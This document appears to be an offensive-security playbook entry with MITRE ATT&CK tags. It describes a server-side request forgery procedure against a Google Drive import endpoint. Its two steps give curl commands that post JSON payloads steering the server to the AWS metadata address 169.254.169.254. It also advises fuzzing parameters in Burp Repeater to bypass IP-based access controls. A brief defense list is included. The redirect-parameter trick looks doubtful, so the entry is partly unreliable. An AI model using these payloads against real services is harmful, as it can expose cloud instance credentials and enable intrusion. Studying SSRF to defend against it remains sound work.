---
id: p2q3r4s5-t6u7-8901-cdef-gh2345678901
name: Craft-SSRF-Payload-via-Google-Drive
tags:
  - ssrf
  - payload
  - bypass
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-ssrf-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:33:24.213Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-SSRF-Payload-via-Google-Drive

## Summary

This procedure crafts a malicious payload for the Google Drive import endpoint to trigger SSRF, redirecting server requests to internal IPs like the AWS metadata service.

## Description

By embedding internal URLs in Google Drive share link parameters (e.g., using 'redirect' or 'url' fields), the server's proxy logic fetches unauthorized resources. This exploits misconfigurations where the Drive integration doesn't sanitize inputs, allowing link-local access (169.254.169.254) from the cloud instance.

## Requirements

1. Identified SSRF endpoint from reconnaissance
2. Burp Suite or curl for payload testing
3. Valid session cookies for authenticated endpoints

## Defense

Defensive measures and detection strategies:

- Implement URL parsing to block private IPs and redirects
- Use allowlists for fetch domains
- Log and alert on requests to metadata endpoints

## Objectives

1. Force server-side request to internal resource
2. Bypass IP-based access controls
3. Confirm SSRF success with response data

## Instructions

### Step 1: Modify Drive URL Parameter

**Context**: Alter the JSON payload to include an internal redirect.

**Command** ([[commands/curl-ssrf-test]]):
```bash
curl -X POST 'https://target.com/api/import-from-drive' -H 'Cookie: session=abc' -H 'Content-Type: application/json' -d '{"url": "https://drive.google.com/file/d/1ABC/view?usp=sharing&redirect=169.254.169.254"}'
```

> The server follows the redirect, fetching from the internal IP; response may include error or partial data.

### Step 2: Iterate Payload Variations

**Context**: Test different parameters if initial fails.

**Command** ([[commands/curl-payload-vary]]):
```bash
curl -X POST 'https://target.com/api/import-from-drive' -d '{"drive_id": "internal", "fetch_url": "http://169.254.169.254"}'
```

> Use Burp Repeater to fuzz parameters like 'uc?id=' or 'open'.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-ssrf-test]]
- [[commands/curl-payload-vary]]

## Tools Used

- [[tools/Burp-Suite]]
- [[tools/curl]]

## Tags

- [[ssrf]]
- [[bypass]]
